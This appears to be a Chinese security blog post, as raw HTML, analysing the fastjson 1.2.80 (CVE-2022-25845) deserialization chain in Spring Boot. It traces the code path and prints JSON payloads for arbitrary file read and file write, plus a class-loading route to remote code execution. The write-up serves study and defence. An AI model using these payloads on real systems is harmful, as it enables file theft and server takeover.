@@ -1,0 +1,453 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>fastjson1.2.80 in Springtboot新链学习 | ph0ebus&#39;s Blog</title>
+  <meta name="author" content="ph0ebus">
+  
+  <meta name="description" content="fastjson1.2.80 in Springtboot">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="fastjson1.2.80 in Springtboot新链学习"/>
+  <meta property="og:site_name" content="ph0ebus&#39;s Blog"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/search.xml" title="ph0ebus&#39;s Blog" type="application/atom+xml">
+  
+  
+    <link href="/favicon.ico" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">ph0ebus&#39;s Blog</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class="fa fa-folder"></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class="fa fa-tags"></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/search.xml" title="Subscribe me.">
+			  <i class="fa fa-user"></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> fastjson1.2.80 in Springtboot新链学习</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  
+		 <div class="alert alert-success description">
+			<i class="fa fa-info-circle"></i> fastjson1.2.80 in Springtboot
+		 </div> <!-- alert -->
+	  		
+
+	  <p><a target="_blank" rel="noopener" href="https://www.geekcon.top/doc/ppt/GC24_SpringBoot%E4%B9%8B%E6%AE%87.pdf">https://www.geekcon.top/doc/ppt/GC24_SpringBoot%E4%B9%8B%E6%AE%87.pdf</a></p>
+<p><a target="_blank" rel="noopener" href="http://squirt1e.top/2024/11/08/fastjson-1.2.80-springboot-xin-lian/">http://squirt1e.top/2024/11/08/fastjson-1.2.80-springboot-xin-lian/</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/luelueking/CVE-2022-25845-In-Spring">GitHub - luelueking&#x2F;CVE-2022-25845-In-Spring: CVE-2022-25845(fastjson1.2.80) exploit in Spring Env!</a></p>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>所有依赖 Fastjson 版本 1.2.80 或更早版本的程序，在应用程序中如果包含使用用户数据调用 <code>JSON.parse</code> 或 <code>JSON.parseObject</code> 方法，但不指定要反序列化的特定类，都会受此漏洞的影响。</p>
+<p><img src="https://s2.loli.net/2024/12/06/XhsNtREHD1KzVrp.webp"></p>
+<p>在之前的研究中针对fj1.2.80已经有了三种常见的利用场景</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/su18/hack-fastjson-1.2.80">GitHub - su18&#x2F;hack-fastjson-1.2.80</a></p>
+<p><img src="https://s2.loli.net/2024/12/06/9lZtiaXscv7uyNq.png"></p>
+<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>需要的依赖</p>
+<ul>
+<li>jackson</li>
+<li>commons-io</li>
+</ul>
+<p>思路</p>
+<ol>
+<li>将InputStream放入fastjson缓存</li>
+<li>读取&#x2F;tmp文件下的文件，找到docbase的文件名。</li>
+<li>往${docbase}&#x2F;WEB-INF&#x2F;classes&#x2F;路径下写入恶意类</li>
+<li>通过fastjson触发类加载</li>
+</ol>
+<p><a target="_blank" rel="noopener" href="https://github.com/ph0ebus/CVE-2022-25845-In-Spring">GitHub - ph0ebus&#x2F;CVE-2022-25845-In-Spring: exploit by python</a></p>
+<p><img src="https://s2.loli.net/2024/12/06/1rDm25MnRZhdtNz.gif"></p>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="cache"><a href="#cache" class="headerlink" title="cache"></a>cache</h2><p>这个新链子也是利用缓存机制</p>
+<p><img src="https://s2.loli.net/2024/12/06/gM8i1WPFYkQfujG.png"></p>
+<p><strong>fastjson反序列化符合条件的期望类时，会将setter参数、public字段、构造函数参数加到缓存中。</strong></p>
+<p><img src="https://s2.loli.net/2024/12/06/TQzRw5kqKnNpM3W.png"></p>
+<p>先分析一下添加缓存的过程，以下面payload为例</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.Exception&quot;</span><span class="punctuation">,</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.fasterxml.jackson.core.exc.InputCoercionException&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2024/12/06/xHlC1AW4XiUVdzR.png"></p>
+<p>在<code>TypeUtils.getClassFromMapping()</code>尝试从缓存中获取<code>java.lang.Exception</code>类</p>
+<p><img src="https://s2.loli.net/2024/12/06/Hr6cygsBOCUnwM5.png"></p>
+<p>在<code>com.alibaba.fastjson.util.TypeUtils#addBaseClassMappings</code>初始化中默认添加了一些作为缓存了的类，其中就包含<code>Exception.class</code></p>
+<p><img src="https://s2.loli.net/2024/12/06/nd2oNlJqp6Ajze8.png"></p>
+<p>可以看到有95个缓存过的类</p>
+<p><img src="https://s2.loli.net/2024/12/06/yxBqvgV1sp7TGOS.png"></p>
+<p>从缓存中获取class后返回，然后继续恢复其字段信息</p>
+<p><code>com.alibaba.fastjson.parser.ParserConfig#getDeserializer</code>先通过获取到的class获取对应的反序列化器</p>
+<p><img src="https://s2.loli.net/2024/12/06/T2lByerNkM6cW8Y.png"></p>
+<p><img src="https://s2.loli.net/2024/12/06/cNfk6zqw3dyLC9i.png"></p>
+<p>可以跟踪到这行关键代码</p>
+<p><img src="https://s2.loli.net/2024/12/06/GjHWun9D54dt6PI.png"></p>
+<p>根据异常处理类的继承关系可以发现，<code>java.lang.Exception</code>类符合这个判断条件，于是反序列化器被设置为<code>ThrowableDeserializer</code></p>
+<p><img src="https://s2.loli.net/2024/12/06/XHfsk8andpSK3Ur.png"></p>
+<p>在<code>com.alibaba.fastjson.parser.deserializer.ThrowableDeserializer#deserialze</code>反序列化过程中会将Exception作为期望类</p>
+<p><img src="https://s2.loli.net/2024/12/06/dknOhKfNLwu3WQA.png"></p>
+<p>然后解析json中的键值对，这里key是<code>@type</code></p>
+<p><img src="https://s2.loli.net/2024/12/06/9Ny6nYQgdVkTKeb.png"></p>
+<p>当key为<code>@type</code>时会将<code>Throwable.class</code>作为期望类传入<code>com.alibaba.fastjson.parser.ParserConfig#checkAutoType()</code></p>
+<p><img src="https://s2.loli.net/2024/12/06/wXdqfV7c92KbDRl.png"></p>
+<p><img src="https://s2.loli.net/2024/12/06/vwoXLx7cret2W9K.png"></p>
+<p>需要经过黑名单过滤和白名单校验</p>
+<p><img src="https://s2.loli.net/2024/12/06/TkJ2c3BC8besmRL.png"></p>
+<p>继续跟进到这段代码，根据传入的Typename来加载类，加载后，如果是期望类的子类则加入到缓存mapping中</p>
+<p><img src="https://s2.loli.net/2024/12/06/oHIThNAP8EXvugj.png"></p>
+<h2 id="read"><a href="#read" class="headerlink" title="read"></a>read</h2><p>进一步分析一下任意读的payload</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;a&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&#123;    \&quot;@type\&quot;: \&quot;java.lang.Exception\&quot;,    \&quot;@type\&quot;: \&quot;com.fasterxml.jackson.core.exc.InputCoercionException\&quot;,    \&quot;p\&quot;: &#123;    &#125;  &#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;b&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$.a.a&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;c&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&#123;  \&quot;@type\&quot;: \&quot;com.fasterxml.jackson.core.JsonParser\&quot;,  \&quot;@type\&quot;: \&quot;com.fasterxml.jackson.core.json.UTF8StreamJsonParser\&quot;,  \&quot;in\&quot;: &#123;&#125;&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;d&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$.c.c&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>利用循环引用尝试将字符串转换为对象并获取对象的值，按作者的话来说，这里是利用JsonPath来忽略本有的异常</p>
+<p>接着上面继续分析，恢复好<code>com.fasterxml.jackson.core.exc.InputCoercionException</code>后，继续利用<code>com.alibaba.fastjson.parser.deserializer.ThrowableDeserializer#deserialze</code>获取字段，根据key实例化出<code>FieldDeserializer</code>进一步处理</p>
+<p><img src="https://s2.loli.net/2024/12/06/1mtdVkABFxUzuPE.png"></p>
+<p>继续，调用<code>TypeUtils#cast</code>进行类型转换</p>
+<p><img src="https://s2.loli.net/2024/12/06/2AmVsTXkhPcIag5.png"></p>
+<p><code>com.alibaba.fastjson.util.TypeUtils#cast(java.lang.Object, java.lang.Class&lt;T&gt;, com.alibaba.fastjson.parser.ParserConfig)</code>会根据传入的obj进行相应的类型转换，这里会进入<code>Map</code>类型这个分支</p>
+<p><img src="https://s2.loli.net/2024/12/06/1bdjB2WZv9KYMue.png"></p>
+<p>跟进到<code>com.alibaba.fastjson.util.TypeUtils#castToJavaBean(java.util.Map&lt;java.lang.String,java.lang.Object&gt;, java.lang.Class&lt;T&gt;, com.alibaba.fastjson.parser.ParserConfig)</code>，根据构造方法参数类型clazz获取反序列化器，clazz为<code>com.fasterxml.jackson.core.JsonParser</code></p>
+<p><img src="https://s2.loli.net/2024/12/06/EsxcvjRPyHqXbmd.png"></p>
+<p>获取到反序列化器后，调用<code>putDeserializer</code>函数<code>this.deserializers.put(type, deserializer)</code></p>
+<p><img src="https://s2.loli.net/2024/12/06/869YZ2PbcfTDQxn.png"></p>
+<p>这里就会将<code>type</code>和<code>deserializer</code>存入<code>com.alibaba.fastjson.util.IdentityHashMap#buckets</code>中</p>
+<p><img src="https://s2.loli.net/2024/12/06/wf7eKacL3WOUbvq.png"></p>
+<p>在后续恢复<code>com.fasterxml.jackson.core.JsonParser</code>中，调用<code>this.deserializers.findClass(typeName)</code>就可以从<code>com.alibaba.fastjson.util.IdentityHashMap#buckets</code>中获取到这个类</p>
+<p><img src="https://s2.loli.net/2024/12/06/28W3JEz6vQjDeAI.png"></p>
+<p><img src="https://s2.loli.net/2024/12/06/C7JuiNVTBd5RDxr.png"></p>
+<p>而<code>com.fasterxml.jackson.core.json.UTF8StreamJsonParser</code>是<code>com.fasterxml.jackson.core.JsonParser</code>的子类，类似前面利用<code>java.lang.Exception</code>恢复<code>com.fasterxml.jackson.core.exc.InputCoercionException</code>一样</p>
+<p><img src="https://s2.loli.net/2024/12/06/YW4jfn9QCVzU6qH.png"></p>
+<p>因为实现JsonParser的类中只有<code>UTF8StreamJsonParser</code>的构造参数存在<code>InputStream</code>，因此可以进一步获取到<code>InputStream</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">UTF8StreamJsonParser</span><span class="params">(IOContext ctxt, <span class="type">int</span> features, InputStream in, ObjectCodec codec, ByteQuadsCanonicalizer sym, <span class="type">byte</span>[] inputBuffer, <span class="type">int</span> start, <span class="type">int</span> end, <span class="type">int</span> bytesPreProcessed, <span class="type">boolean</span> bufferRecyclable)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(ctxt, features);</span><br><span class="line">    <span class="built_in">this</span>._quadBuffer = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">16</span>];</span><br><span class="line">    <span class="built_in">this</span>._inputStream = in;</span><br><span class="line">    <span class="built_in">this</span>._objectCodec = codec;</span><br><span class="line">    <span class="built_in">this</span>._symbols = sym;</span><br><span class="line">    <span class="built_in">this</span>._inputBuffer = inputBuffer;</span><br><span class="line">    <span class="built_in">this</span>._inputPtr = start;</span><br><span class="line">    <span class="built_in">this</span>._inputEnd = end;</span><br><span class="line">    <span class="built_in">this</span>._currInputRowStart = start - bytesPreProcessed;</span><br><span class="line">    <span class="built_in">this</span>._currInputProcessed = (<span class="type">long</span>)(-start + bytesPreProcessed);</span><br><span class="line">    <span class="built_in">this</span>._bufferRecyclable = bufferRecyclable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2024/12/06/HR4eImwvabdiuNn.png"></p>
+<p>而获取<code>InputStream</code>就是为了实现任意文件读</p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/esjHYVm5aCJfkT6I1D0uTQ">fastjson 读文件 gadget 的利用场景扩展</a></p>
+<p>原blackhat usa 21的议题ppt</p>
+<p><a target="_blank" rel="noopener" href="https://i.blackhat.com/USA21/Wednesday-Handouts/US-21-Xing-How-I-Used-a-JSON.pdf">https://i.blackhat.com/USA21/Wednesday-Handouts/US-21-Xing-How-I-Used-a-JSON.pdf</a></p>
+<p>这里就是通过<code>org.apache.commons.io.input.BOMInputStream</code>来逐字节盲读取文件</p>
+<p><img src="https://s2.loli.net/2024/12/06/IvcKEtwdb4z8B5r.png"></p>
+<p>在<code>org.apache.commons.io.input.BOMInputStream#getBOM</code>中会调用<code>org.apache.commons.io.input.BOMInputStream#find</code>方法</p>
+<p><img src="https://s2.loli.net/2024/12/06/cYSRWoUDg19bJaq.png"></p>
+<p>跟进find方法可以发现，这里先把 delegate 输入流的字节码转成 int 数组，然后拿 <code>ByteOrderMark</code>里的 bytes 挨个字节遍历去比对，如果遍历过程有比对错误的，<code>getBom</code>方法 就会返回<code>null</code>，如果遍历结束，没有比对错误那就会返回一个<code>ByteOrderMark</code>对象</p>
+<p><img src="https://s2.loli.net/2024/12/06/YvrIkgVilx2AhZ4.png"></p>
+<p>因此逐字节盲读取的关键差异点就在这里</p>
+<p>最后输入流来源来自于<code>jdk.nashorn.api.scripting.URLReader</code>，<code>public URLReader(URL url)</code>可以传入一个 URL 对象。这就意味着 file jar http 等协议都可以使用。这里传入了file协议用于列举目录</p>
+<h2 id="write"><a href="#write" class="headerlink" title="write"></a>write</h2><p>然后分析一下任意文件写的payload</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;a&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.io.InputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.input.AutoCloseInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;in&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;input&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.input.CharSequenceInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;cs&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.String&quot;</span></span><br><span class="line">          <span class="string">&quot;$&#123;shellcode&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;charset&quot;</span><span class="punctuation">:</span> <span class="string">&quot;iso-8859-1&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;bufferSize&quot;</span><span class="punctuation">:</span> $<span class="punctuation">&#123;</span>size<span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;branch&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.output.WriterOutputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;writer&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.output.LockableFileWriter&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;file&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$&#123;file2write&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;charset&quot;</span><span class="punctuation">:</span> <span class="string">&quot;iso-8859-1&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;append&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">          <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;charset&quot;</span><span class="punctuation">:</span> <span class="string">&quot;iso-8859-1&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;bufferSize&quot;</span><span class="punctuation">:</span> <span class="number">1024</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;writeImmediately&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;closeBranch&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;b&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.io.InputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.input.ReaderInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;reader&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;inputStream&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$.a&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;httpContentType&quot;</span><span class="punctuation">:</span> <span class="string">&quot;text/xml&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;lenient&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;defaultEncoding&quot;</span><span class="punctuation">:</span> <span class="string">&quot;iso-8859-1&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;charsetName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;iso-8859-1&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;bufferSize&quot;</span><span class="punctuation">:</span> <span class="number">1024</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;c&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这里和blackhat的议题提到的也有很多共通之处，都是利用<code>org.apache.commons.io.input.TeeInputStream#read()</code>方法来写入数据</p>
+<p><img src="https://s2.loli.net/2024/12/06/PyQw8an1jANZiKD.png"></p>
+<p>其中的一些细节可以参考</p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/6fHJ7s6Xo4GEdEGpKFLOyg">Fastjson 1.2.68 反序列化漏洞 Commons IO 2.x 写文件利用链挖掘分析</a></p>
+<p>但是这里作者似乎找到了一个更好的链子规避blackhat议题中原Poc链子中存在的写入缓冲区的8192字节限制</p>
+<p><img src="https://s2.loli.net/2024/12/06/vybF63gZr5WcBtK.png"></p>
+<p><img src="https://s2.loli.net/2024/12/06/i385Ns6QWzLGV7d.png"></p>
+<h2 id="write2RCE"><a href="#write2RCE" class="headerlink" title="write2RCE"></a>write2RCE</h2><p>然后需要讨论的就是如何在任意文件写入的情况下RCE</p>
+<p><a target="_blank" rel="noopener" href="https://mrwq.github.io/aggregate-paper/butian/JDK8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%88%B0RCE/">https://mrwq.github.io/aggregate-paper/butian/JDK8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%88%B0RCE/</a></p>
+<p><a target="_blank" rel="noopener" href="https://landgrey.me/blog/22/">Spring Boot Fat Jar 写文件漏洞到稳定 RCE 的探索</a></p>
+<p>常见的做法比如覆盖charsets.jar就是利用jvm的懒加载，覆盖<font style="color:rgb(74, 81, 83);">JDK HOME 目录下原有的 jar中</font>未被加载的charsets.jar包。但这个做法需要事先知道 JDK HOME 的目录路径，并且需要root权限。而且需要针对目标服务jdk版本准备恶意charsets.jar文件，否则可能影响正常服务；又比如利用类加载，在jdk home目录下向classes目录写入恶意class文件，然后利用fastjson的<code>@type</code>触发类加载即可RCE</p>
+<p>这里作者也是利用了类加载，不过这里换了一个新的类加载口子</p>
+<p>在fastjson反序列化过程中，针对不在黑白名单，并且缓存中没有的类会通过<code>com.alibaba.fastjson.util.TypeUtils#loadClass()</code>尝试加载类，其中会通过通过<code>TomcatEmbeddedWebappClassLoader</code>类加载器加载类</p>
+<p><img src="https://s2.loli.net/2024/12/06/yjiV3t7FDRwpx9z.png"></p>
+<p>根据双亲委派机制会委派<code>WebappClassLoaderBase</code>来加载，一路跟下去可以发现在<code>org.apache.catalina.loader.WebappClassLoaderBase#findClass</code>中会调用<code>org.apache.catalina.loader.WebappClassLoaderBase#findClassInternal</code>方法来寻找内部类</p>
+<p><img src="https://s2.loli.net/2024/12/06/Kw93dtihj1lrUbz.png"></p>
+<p>跟进<code>findClassInternal</code></p>
+<p><img src="https://s2.loli.net/2024/12/06/op6Bkv4KFyXPWdH.png"></p>
+<p>进一步跟进<code>org.apache.catalina.webresources.StandardRoot#getClassLoaderResource</code>跟踪类加载路径</p>
+<p><img src="https://s2.loli.net/2024/12/06/6NYIJHn8te5VU1m.png"></p>
+<p><img src="https://s2.loli.net/2024/12/06/4dE2QITebDiFmA1.png"></p>
+<p>这里会判断<code>isCachingAllowed()</code>，而属性<code>cachingAllowed</code>默认为true</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isCachingAllowed</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.cachingAllowed;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2024/12/06/pFwBZAL3VOdE42m.png"></p>
+<p>所以进到<code>org.apache.catalina.webresources.Cache#getResource</code>方法</p>
+<p><img src="https://s2.loli.net/2024/12/06/Ql8PvtHAC26RWFT.png"></p>
+<p>首先调用noCache方法，很明显这里会返回true，从而调用到<code>this.root.getResourceInternal(path, useClassLoaderResources)</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">noCache</span><span class="params">(String path)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> path.endsWith(<span class="string">&quot;.class&quot;</span>) &amp;&amp; (path.startsWith(<span class="string">&quot;/WEB-INF/classes/&quot;</span>) || path.startsWith(<span class="string">&quot;/WEB-INF/lib/&quot;</span>)) || path.startsWith(<span class="string">&quot;/WEB-INF/lib/&quot;</span>) &amp;&amp; path.endsWith(<span class="string">&quot;.jar&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>跟进<code>org.apache.catalina.webresources.StandardRoot#getResourceInternal</code></p>
+<p><img src="https://s2.loli.net/2024/12/06/UIC9luhJn8txDev.png"></p>
+<p>就可以发现这个类加载路径</p>
+<p><img src="https://s2.loli.net/2024/12/06/n31oU8SBHftCmLJ.png"></p>
+<p>如果这个class文件存在就会正常返回该文件资源，然后恶意类加载达到RCE</p>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>好复杂好复杂，结合三篇议题ppt才能微懂</p>
+
+	  <div class="article-footer-copyright">
+
